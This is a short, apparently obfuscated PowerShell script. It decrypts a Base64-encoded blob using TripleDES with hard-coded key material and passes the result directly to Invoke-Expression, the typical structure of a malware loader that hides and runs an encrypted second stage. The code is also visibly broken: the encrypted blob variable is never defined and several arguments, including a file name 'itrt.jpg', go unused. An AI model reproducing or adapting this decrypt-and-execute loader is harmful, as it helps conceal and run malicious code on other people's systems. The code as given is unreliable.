



function bbedvvibvo([String] $vvmfeszsug, [String] $feordmruty, [String] $djjfyveuv, [String] $file, [String] $traert)
{
$odjvju4 = New-Object System.Text.ASCIIEncoding;
$jbymfxiyowd = $odjvju4.GetBytes("JZIBZARTZGPDQPVA");
$zsuedqipxfa = [Convert]::FromBase64String($zsuedqipxf);
$uzurhg = New-Object System.Security.Cryptography.PasswordDeriveBytes($vvmfeszsug, $odjvju4.GetBytes($feordmruty), "SHA1", 2);
[Byte[]] $vejjsocdte = $uzurhg.GetBytes(16);
$tuteujhnds = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider;
$tuteujhnds.Mode = [System.Security.Cryptography.CipherMode]::CBC;
[Byte[]] $xerpgvwqzh = New-Object Byte[]($zsuedqipxfa.Length);
$rxmxvessjp = $tuteujhnds.CreateDecryptor($vejjsocdte, $jbymfxiyowd);
$hzesvschmr = New-Object System.IO.MemoryStream($zsuedqipxfa, $True);
$tndoyfutnn = New-Object System.Security.Cryptography.CryptoStream($hzesvschmr, $rxmxvessjp, [System.Security.Cryptography.CryptoStreamMode]::Read);
$kdpxydotwt = $tndoyfutnn.Read($xerpgvwqzh, 0, $xerpgvwqzh.Length);
$hzesvschmr.Close();
$tndoyfutnn.Close();
$tuteujhnds.Clear();
  $r = $xerpgvwqzh[3..($xerpgvwqzh.Length-1)]; 
return $odjvju4.GetString($xerpgvwqzh);
}
 $cdgviweliy = bbedvvibvo "tgw46ckjoes528imb07npvydzu1la9h3" "0h4okpgcq8b6ji72vnz3urxea9mlydsf" "0h4okpgcq8b6ji72vnz3urxea9mlydsf" "itrt.jpg" "read"

 invoke-expression $cdgviweliy